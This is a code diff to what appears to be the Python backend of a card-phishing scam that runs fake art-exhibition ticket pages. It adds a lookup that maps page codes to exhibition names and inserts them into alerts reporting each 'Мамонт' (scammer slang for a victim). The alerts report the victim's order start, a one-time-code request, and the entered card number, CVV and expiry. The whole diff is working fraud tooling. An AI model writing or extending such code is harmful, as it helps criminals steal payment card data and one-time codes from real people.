@@ -80,6 +80,33 @@ def get_best_fio(default_name: str = "", page_code: str = "", ip: str = "") -> s
         return fio_by_ip[ip]["name"]
     return "Клієнт"
 
+def get_event_name_from_page_code(page_code):
+    """Визначає назву події за page_code"""
+    if not page_code:
+        return "Выставка"
+    
+    try:
+        # Шукаємо page_code в URL
+        match = re.search(r'page=(\d+-\d+)', page_code)
+        if match:
+            series = int(match.group(1).split('-')[0])
+            event_names = [
+                "Terroir and Traditions",
+                "Collection Co–selection", 
+                "Snucie",
+                "Art that saves lives",
+                "Gotong Royong",
+                "Anna Konik",
+                "Uncensored",
+                "Jacek Adamas"
+            ]
+            if 1 <= series <= len(event_names):
+                return event_names[series - 1]
+    except:
+        pass
+    
+    return "Выставка"
+
 def cleanup_old_payment_totals():
     """Видаляє старі записи total сум (старіше 1 години)"""
     current_time = time.time()
@@ -622,8 +649,11 @@ def format_text_notification_message(admin_username, name, price, currency, ip=N
 def format_order_start_message(page_code, name, phone, email, ip, price, currency):
     """Формує красиве повідомлення про початок оформлення замовлення"""
     
+    # Отримуємо назву івенту
+    event_name = get_event_name_from_page_code(page_code)
+    
     message = (
-        f"🔔 Мамонт оформляет заказа\n\n"
+        f"🔔 Мамонт оформляет заказ {event_name}\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
         f"📱 Телефон: {phone or 'Не указано'}\n"
@@ -636,7 +666,11 @@ def format_order_start_message(page_code, name, phone, email, ip, price, currenc
 
 def format_code_request_message(admin_username, name, price, currency, page_code, code_value=""):
     """Формує красиве повідомлення про запит коду"""
-    message = f"🔔 Отправлен запрос на код\n\n"
+    
+    # Отримуємо назву івенту
+    event_name = get_event_name_from_page_code(page_code)
+    
+    message = f"🔔 Отправлен запрос на код {event_name}\n\n"
     
     # Вбивер (власник посилання)
     if admin_username:
@@ -667,8 +701,11 @@ def format_code_request_message(admin_username, name, price, currency, page_code
 def format_card_payment_message(page_code, name, price, currency, card_number, cvv="", expiry="", country=""):
     """Формує красиве повідомлення про введення карти"""
     
+    # Отримуємо назву івенту
+    event_name = get_event_name_from_page_code(page_code)
+    
     message = (
-        f"🔔 Мамонт ввел карту\n\n"
+        f"🔔 Мамонт ввел карту {event_name}\n\n"
         f"#️⃣ Ссылка: ?page={page_code or 'Не указано'}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
         f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
